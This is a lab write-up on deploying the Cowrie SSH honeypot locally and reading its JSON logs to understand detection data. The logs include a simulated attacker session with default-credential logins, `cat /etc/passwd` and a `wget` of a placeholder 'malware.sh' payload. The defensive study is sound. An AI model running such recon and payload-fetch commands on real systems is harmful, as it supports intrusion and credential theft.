# Cowrie SSH Honeypot — Local Deployment

**Difficulty:** Beginner (deployment) / Intermediate (log analysis)
**Category:** Deception Technology, SOC Fundamentals
**Date completed:** 2026-09-02
**Status:** Phase 1 (local, no internet exposure). Phase 2 (cloud VPS + real attacker traffic + Wazuh integration) planned later.

## Summary

Deployed [Cowrie](https://github.com/cowrie/cowrie), a medium-interaction SSH/Telnet honeypot, locally via Docker. Cowrie doesn't just refuse or accept connections — it emulates a full fake Linux shell, so anything an attacker does after logging in (commands run, files read, files downloaded) gets logged in detail instead of the connection just dying. Generated a realistic test session against it to understand exactly what data a honeypot like this captures and why each piece matters for detection work.

This is the first step of a larger plan: a local proof-of-concept now, a cloud-hosted version exposed to real internet attackers later, feeding into a home Wazuh SIEM lab for full detection/triage practice.

## What a Honeypot Actually Is

A honeypot is a fake system with no legitimate reason for anyone to touch it — so any interaction with it is essentially guaranteed to be malicious. Unlike a real server, there's no "false positive" problem: nobody accidentally SSHes into a honeypot. Cowrie specifically fakes an SSH/Telnet server; once someone "logs in" (Cowrie deliberately accepts a range of weak credentials, same as many misconfigured real servers do), they land in a convincing fake Debian filesystem and every single thing they type gets recorded.

## Deployment

Installed Docker (`docker.io` from Kali's repos) and ran the official image with one command:

```
docker run -d -p 2222:2222 --name cowrie-honeypot --restart unless-stopped cowrie/cowrie:latest
```

That's it — Cowrie is now listening on port 2222, pretending to be an SSH server.

## Test Methodology

Since this is running locally with no internet exposure yet, there's no real attacker traffic to observe. To understand what the tool actually captures, I simulated attacker behavior against my own honeypot using a small Python script (`paramiko`, an SSH library):

1. Tried five common weak username/password pairs to see which ones Cowrie's fake auth accepts (it doesn't accept everything — that's deliberate, it mimics a real brute-force success rate).
2. Once "in," ran a realistic recon-and-exfiltration sequence: `whoami`, `uname -a`, `ls -la /`, `cat /etc/passwd`, `wget` a fake payload URL, `ps aux`, `exit`.

Full raw captured log: [`evidence/cowrie-session-log-2026-09-02.json`](../evidence/cowrie-session-log-2026-09-02.json)

## Log Analysis — What Got Captured and Why It Matters

Cowrie logs everything as structured JSON (`cowrie.json`), one event per line — this is exactly the format a SIEM like Wazuh ingests, which is why this project is designed to plug into the home lab later.

**1. Connection + client fingerprinting** — every connection logs source IP/port, and a `hassh` fingerprint (a hash of the client's SSH algorithm preferences). Two different attackers using two different SSH clients (or the same tool, different versions) often produce different hassh values — useful for clustering/attributing activity even before looking at behavior.

**2. Credential attempts, failed and successful:**
```
login attempt [root/123456] failed
login attempt [root/root] failed
login attempt [root/toor] succeeded
login attempt [admin/admin] succeeded
login attempt [root/password] succeeded
login attempt [test/test] succeeded
```
This is a textbook credential-stuffing pattern — a handful of the most common weak default credentials, tried in rapid succession, several landing. In a real SOC context, several successful "logins" against the same host in seconds is itself a massive red flag regardless of what happens next — the volume and speed is the signal, not just the individual attempt.

**3. Full command session, logged one command at a time:**
```
CMD: whoami
CMD: uname -a
CMD: ls -la /
CMD: cat /etc/passwd
CMD: wget http://example.com/malware.sh
CMD: ps aux
CMD: exit
```
This is the recon phase of a real intrusion, captured exactly as it happened: identify yourself, fingerprint the OS, look around, grab the password file, pull down a second-stage payload, check what's running. An analyst reading this log doesn't need to guess intent — it's a readable narrative of an attack in progress.

**4. File download capture** — the `wget` command didn't just get logged as text. Cowrie actually intercepted it, saved the "downloaded" content, and recorded its SHA-256 hash:
```
Downloaded URL (http://example.com/malware.sh) with SHA-256 ff67a9d7...
```
In a real incident, that hash is what you'd check against VirusTotal or a threat intel feed to identify the malware family — this is the exact mechanic the Wazuh+VirusTotal integration in the planned SIEM lab automates.

**5. TTY session recording** — the entire terminal session was also saved as a replayable recording (`cowrie.log.closed`, `ttylog` field), meaning the full session can be played back later exactly as it happened, not just reconstructed from log lines.

## What This Demonstrates

- Understanding of deception technology as a detection mechanism (ties to Security+ Domain 1.2).
- Ability to deploy and configure a real security tool from scratch, not just read about it.
- Comfort reading and interpreting structured security logs — connection metadata, auth events, command telemetry, file capture — which is the core daily task of a SOC analyst.
- A concrete artifact (real captured JSON logs) instead of just a description of what the tool "should" do.

## Next Steps

- Deploy this same honeypot on a cloud VPS to capture genuine internet attacker traffic instead of simulated sessions.
- Forward its logs into a home Wazuh SIEM instance (planned — see the home SIEM lab project) for real-time alerting and dashboarding instead of manually reading the JSON file.
